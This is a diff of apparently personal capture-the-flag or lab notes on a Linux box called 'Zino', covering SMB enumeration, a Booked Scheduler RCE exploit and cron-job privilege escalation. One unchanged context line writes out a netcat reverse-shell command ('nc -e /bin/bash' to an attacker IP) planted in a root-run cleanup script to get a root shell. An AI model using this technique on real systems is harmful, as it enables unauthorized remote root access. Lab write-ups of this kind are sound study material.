@@ -3,7 +3,7 @@ Alias: Zino
 Date: 6/1/22
 Platform: Linux
 Difficulty: Intermediate
-Tags: #SMBenumeration #BookedSchedulerv2.7.5RCEexploit
+Tags: #SMBenumeration #BookedSchedulerv2.7.5RCEexploit #CronJobmodificationPrivilegeEscalation
 Status: Finished
 IP: 192.168.108.64
 ---
@@ -12,7 +12,8 @@ IP: 192.168.108.64
 
 
 # Resolution summary
-- Text
+- Found username and password in SMB log share file
+- 
 - Text
 
 ## Improved skills
@@ -216,6 +217,7 @@ Enumerated top 200 UDP ports:
 ##### -As I kept receiving errors when trying to navigate on "vi" locally on target machine I created a "cleanup.py" file on my kali machine and changed "rm -r /var/www/html/booked/uploads/reservation/* " to "nc -e /bin/bash 192.168.49.235 21":
 
 ![](Pasted%20image%2020221018232639.png)
+#CronJobmodificationPrivilegeEscalation
 
 ##### -I then uploaded the "cleanup.py" script I created onto target machine and typed "mv cleanup.py /var/www/html/booked/" to overwrite the existing cleanup.py file in /var/www/html/booked/ and started a netcat listener on port 21 and waited a few minutes and received a root shell:
 
